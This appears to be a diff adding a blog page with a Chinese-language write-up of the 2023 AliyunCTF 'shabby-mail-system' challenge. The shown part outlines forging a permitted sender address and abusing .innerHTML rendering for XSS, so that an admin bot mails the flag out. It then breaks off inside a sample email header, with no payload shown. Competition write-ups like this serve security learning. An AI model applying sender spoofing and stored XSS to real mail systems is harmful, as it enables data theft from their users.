@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.134.0">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Snakinya" />
+  <meta property="og:url" content="https://www.snakin.top/posts/aliyunctf-%E7%AE%80%E5%8D%95%E7%9A%84%E9%82%AE%E4%BB%B6/" />
+  <link rel="canonical" href="https://www.snakin.top/posts/aliyunctf-%E7%AE%80%E5%8D%95%E7%9A%84%E9%82%AE%E4%BB%B6/" /><link rel="apple-touch-icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="shortcut" href="https://www.snakin.top/favicon.ico" /><link rel="alternate" type="application/atom+xml" href="https://www.snakin.top/index.xml" title="Snakinya-明烛天南">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "https:\/\/www.snakin.top\/"
+      },
+      "articleSection" : "posts",
+      "name" : "CTF | 2023AliyunCTF shabby-mail-system",
+      "headline" : "CTF | 2023AliyunCTF shabby-mail-system",
+      "description" : "简陋的邮件平台\/shabby-mail-system 题目概述： 注册账号登录\nflag页面需要管理员才能看，网页渲染 HTML 邮件的方式是采用 .innerHTML 的方式。由于管理员bot一直在线，可以再通过xss的方式让管理员bot将flag发送到我们的邮箱。不过邮件平台禁止了除指定邮箱外的邮件地址向管理员发件，我们可以通过伪造Bx7VH7JTK4vzRb@outlook.com向admin@localhost发邮件。 下载查看一下邮件格式\nTeapot-Authentication-Result: Passed dkim=pass. Skipped. From local sender; format=pass. Address alignment validation passed Content-Type: text\/plain; charset=utf-8 From: admin@localhost To: a0ec75f3e0f5c4cc@localhost Subject: =?UTF-8?B?5oiR5bey57uP6LeR6Lev5LqG?= Message-ID: \u0026lt;c29f7b1f-ec29-ef09-0a95-9500cf1eb5dd@localhost\u0026gt; Content-Transfer-Encoding: base64 Date: Sat, 29 Apr 2023 12:20:16 \u002b0000 MIME-Version: 1.0 6Jm954S25bmz5Y\u002bw5by65Yi25oiRMjTlsI\/ml7blnKjnur8sIOS9huaYr\u002baIkeW3sue7j\u002baLiem7 keS6huaJgOacieeahOadpeS\/oSwg6Zmk5LqG5oiR55qE56eB5Lq66YKu566xIE9CeDdWSDdKVEs0 dnpSYkBvdXRsb29rLmNvbSwg5L2g5Lus54Om5LiN5LqG5oiRLCDlmI7lmI4h ",
+      "inLanguage" : "en-US",
+      "author" : "Snakinya",
+      "creator" : "Snakinya",
+      "publisher": "Snakinya",
+      "accountablePerson" : "Snakinya",
+      "copyrightHolder" : "Snakinya",
+      "copyrightYear" : "2023",
+      "datePublished": "2023-05-01 00:00:00 \u002b0000 UTC",
+      "dateModified" : "2023-05-01 00:00:00 \u002b0000 UTC",
+      "url" : "https:\/\/www.snakin.top\/posts\/aliyunctf-%E7%AE%80%E5%8D%95%E7%9A%84%E9%82%AE%E4%BB%B6\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>CTF | 2023AliyunCTF shabby-mail-system</title>
+  <meta property="og:title" content="CTF | 2023AliyunCTF shabby-mail-system" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="简陋的邮件平台/shabby-mail-system 题目概述： 注册账号登录
+flag页面需要管理员才能看，网页渲染 HTML 邮件的方式是采用 .innerHTML 的方式。由于管理员bot一直在线，可以再通过xss的方式让管理员bot将flag发送到我们的邮箱。不过邮件平台禁止了除指定邮箱外的邮件地址向管理员发件，我们可以通过伪造Bx7VH7JTK4vzRb@outlook.com向admin@localhost发邮件。 下载查看一下邮件格式
+Teapot-Authentication-Result: Passed dkim=pass. Skipped. From local sender; format=pass. Address alignment validation passed Content-Type: text/plain; charset=utf-8 From: admin@localhost To: a0ec75f3e0f5c4cc@localhost Subject: =?UTF-8?B?5oiR5bey57uP6LeR6Lev5LqG?= Message-ID: &lt;c29f7b1f-ec29-ef09-0a95-9500cf1eb5dd@localhost&gt; Content-Transfer-Encoding: base64 Date: Sat, 29 Apr 2023 12:20:16 &#43;0000 MIME-Version: 1.0 6Jm954S25bmz5Y&#43;w5by65Yi25oiRMjTlsI/ml7blnKjnur8sIOS9huaYr&#43;aIkeW3sue7j&#43;aLiem7 keS6huaJgOacieeahOadpeS/oSwg6Zmk5LqG5oiR55qE56eB5Lq66YKu566xIE9CeDdWSDdKVEs0 dnpSYkBvdXRsb29rLmNvbSwg5L2g5Lus54Om5LiN5LqG5oiRLCDlmI7lmI4h " />
+  <meta name="description" content="简陋的邮件平台/shabby-mail-system 题目概述： 注册账号登录
+flag页面需要管理员才能看，网页渲染 HTML 邮件的方式是采用 .innerHTML 的方式。由于管理员bot一直在线，可以再通过xss的方式让管理员bot将flag发送到我们的邮箱。不过邮件平台禁止了除指定邮箱外的邮件地址向管理员发件，我们可以通过伪造Bx7VH7JTK4vzRb@outlook.com向admin@localhost发邮件。 下载查看一下邮件格式
+Teapot-Authentication-Result: Passed dkim=pass. Skipped. From local sender; format=pass. Address alignment validation passed Content-Type: text/plain; charset=utf-8 From: admin@localhost To: a0ec75f3e0f5c4cc@localhost Subject: =?UTF-8?B?5oiR5bey57uP6LeR6Lev5LqG?= Message-ID: &lt;c29f7b1f-ec29-ef09-0a95-9500cf1eb5dd@localhost&gt; Content-Transfer-Encoding: base64 Date: Sat, 29 Apr 2023 12:20:16 &#43;0000 MIME-Version: 1.0 6Jm954S25bmz5Y&#43;w5by65Yi25oiRMjTlsI/ml7blnKjnur8sIOS9huaYr&#43;aIkeW3sue7j&#43;aLiem7 keS6huaJgOacieeahOadpeS/oSwg6Zmk5LqG5oiR55qE56eB5Lq66YKu566xIE9CeDdWSDdKVEs0 dnpSYkBvdXRsb29rLmNvbSwg5L2g5Lus54Om5LiN5LqG5oiRLCDlmI7lmI4h " />
+  <meta property="og:locale" content="cn" /><meta property="og:image" content="https://www.snakin.top/favicon.ico" />
+  
+
+  
+    <style>.highlight{position:relative}.clipboard-button{color:var(--white);background-color:rgba(255,255,255,.786);border:none;border-radius:6px;padding:3px 5px 2px;font-size:1rem;position:absolute;z-index:1;right:0;top:0;margin:10px;transition:.1s;opacity:.5}.clipboard-button>svg{fill:var(--white)}.clipboard-button:hover,.clipboard-button:focus,pre:active~.clipboard-button,pre:focus~.clipboard-button,div.highlight:active>.clipboard-button,div.highlight:focus>.clipboard-button{cursor:pointer;opacity:1}</style>
+  
+  
+    <style>@import "https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/lxgwwenkaiscreenr.css";.busuanzi-footer{font-size:14px;color:#666;display:inline-block;gap:10px;align-items:center}.busuanzi-footer .separator{margin:0 5px;color:#999}.footer-beian{font-size:12px;color:#999;margin-top:5px;text-align:center}.footer-beian a{color:#0073e6;text-decoration:none}.footer-beian a:hover{text-decoration:underline}body{font-family:lxgw wenkai screen r,bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:40%;min-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none;word-break:break-all}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:1px;font-size:16px;font-weight:550;font-family:Consolas,Monaco,Menlo,Consolas,monospace;word-break:break-all;word-wrap:break-word;overflow-y:auto;max-height:300px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px;text-size-adjust:100%;-ms-text-size-adjust:100%;-moz-text-size-adjust:100%;-webkit-text-size-adjust:100%}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:150%}.site-date-catalog{font-size:2rem}.header-title{font-size:1.5rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px;font-weight:700}.header-item a:hover{font-weight:700;color:#8a2be2}.header-item a:visited{font-weight:700}.header-item a:active{font-weight:700}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px;text-align:center}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){article{max-width:100%;min-width:300px}.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}table{width:100%;color:#333;border-width:1px;border-color:#666;border-collapse:collapse}table th{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#dedede}table td{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#fff}.post-content a{color:#0969da;box-shadow:none;text-decoration:none}a:hover{font-weight:400}.post-content a:hover{text-decoration:underline}.footnotes{> hr { display: none; }}.footnotes ol{line-height:1.4;margin-bottom:20px}.footnotes li{margin-bottom:5px}.footnotes ol li p{margin:0;padding:0;line-height:1.4}.donation{display:block;margin-left:auto;margin-right:auto}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+  
+    <style>.toc{background-color:#f5f5f5;margin:0 auto;width:90%;border-radius:8px;padding:20px;box-shadow:0 4px 6px rgba(0,0,0,.1)}.toc ul{padding-left:20px}.toc li{line-height:1.6;margin-bottom:0}.toc li a{color:#333}.toc li a:hover{color:#000}.toc details{cursor:pointer}.toc summary{font-weight:700}.toc .inner{margin:0 0 0 20px;padding:0 15px 15px 20px;padding-bottom:0;font-size:16px;max-height:83vh;overflow-y:auto}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Snakinya-明烛天南">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+
+
+
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post Chinese" id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  
+  <div class="header-title">
+    <a href="/"
+      >Snakinya</a
+    >
+  </div>
+  <div class="header-subtitle" style="color:blueviolet;">苍山负雪，明烛天南</div>
+</header>
+
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="https://github.com/Snakinya" target="_self">Github</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/categories" target="_self">Categories</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/about/" target="_self">About</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/books/" target="_self">Books</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/friends/" target="_self">Friends</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/posts/" target="_self">Posts</a>
+  </div>
+  
+</div>
+
+<div class="header-line"></div>
+
+        </div>
+
+        <header class="post-header">
+          <h1 class="post-title">CTF | 2023AliyunCTF shabby-mail-system</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2023-05-01 00:00:00 UTC">
+                01 May 2023
+              </time>
+              
+            </div>
+            
+            <div class="col-xs-6">
+
+              
+              <div class="post-author">
+              <span id="busuanzi_container_page_pv">@本文阅读量<span id="busuanzi_value_page_pv"></span>次</span>
+                
+            </div>
+          </div>
+          
+        </header>
+        
+
+        <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e7%ae%80%e9%99%8b%e7%9a%84%e9%82%ae%e4%bb%b6%e5%b9%b3%e5%8f%b0shabby-mail-system" aria-label="简陋的邮件平台/shabby-mail-system">简陋的邮件平台/shabby-mail-system</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+        
+
+
+
+        <div class="post-content markdown-body">
+          
+          <h2 id="简陋的邮件平台shabby-mail-system">简陋的邮件平台/shabby-mail-system</h2>
+<p>题目概述：
+注册账号登录</p>
+<p><img alt="截屏2023-04-29 20.28.34.png" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/1682771322553-84a3aa4a-28f4-40ec-9678-7aac0e8aaf20.png"></p>
+<p>flag页面需要管理员才能看，网页渲染 HTML 邮件的方式是采用 .innerHTML 的方式。由于管理员bot一直在线，可以再通过xss的方式让管理员bot将flag发送到我们的邮箱。不过邮件平台禁止了除指定邮箱外的邮件地址向管理员发件，我们可以通过伪造<strong><a href="mailto:Bx7VH7JTK4vzRb@outlook.com">Bx7VH7JTK4vzRb@outlook.com</a></strong>向<strong>admin@localhost</strong>发邮件。
+下载查看一下邮件格式</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Teapot<span style="color:#ff6ac1">-</span>Authentication<span style="color:#ff6ac1">-</span>Result: Passed
+</span></span><span style="display:flex;"><span>	dkim<span style="color:#ff6ac1">=</span>pass. Skipped. From local sender;
+</span></span><span style="display:flex;"><span>	format<span style="color:#ff6ac1">=</span>pass. Address alignment validation passed
+</span></span><span style="display:flex;"><span>Content<span style="color:#ff6ac1">-</span>Type: text<span style="color:#ff6ac1">/</span>plain; charset<span style="color:#ff6ac1">=</span>utf<span style="color:#ff6ac1">-</span>8
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">From</span>: admin<span style="color:#ff9f43">@localhost</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">To</span>: a0ec75f3e0f5c4cc<span style="color:#ff9f43">@localhost</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Subject</span>: <span style="color:#ff6ac1">=?</span>UTF<span style="color:#ff6ac1">-</span>8<span style="color:#ff6ac1">?</span>B<span style="color:#ff6ac1">?</span>5oiR5bey57uP6LeR6Lev5LqG<span style="color:#ff6ac1">?=</span>
+</span></span><span style="display:flex;"><span>Message<span style="color:#ff6ac1">-</span>ID: <span style="color:#ff6ac1">&lt;</span>c29f7b1f<span style="color:#ff6ac1">-</span>ec29<span style="color:#ff6ac1">-</span>ef09<span style="color:#ff6ac1">-</span>0a95<span style="color:#ff6ac1">-</span>9500cf1eb5dd<span style="color:#ff9f43">@localhost</span><span style="color:#ff6ac1">&gt;</span>
+</span></span><span style="display:flex;"><span>Content<span style="color:#ff6ac1">-</span>Transfer<span style="color:#ff6ac1">-</span>Encoding: base64
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Date</span>: Sat, 29 Apr 2023 12:20:16 <span style="color:#ff6ac1">+</span>0000
+</span></span><span style="display:flex;"><span>MIME<span style="color:#ff6ac1">-</span>Version: 1.<span style="color:#57c7ff">0</span>
+</span></span><span style="display:flex;"><span>
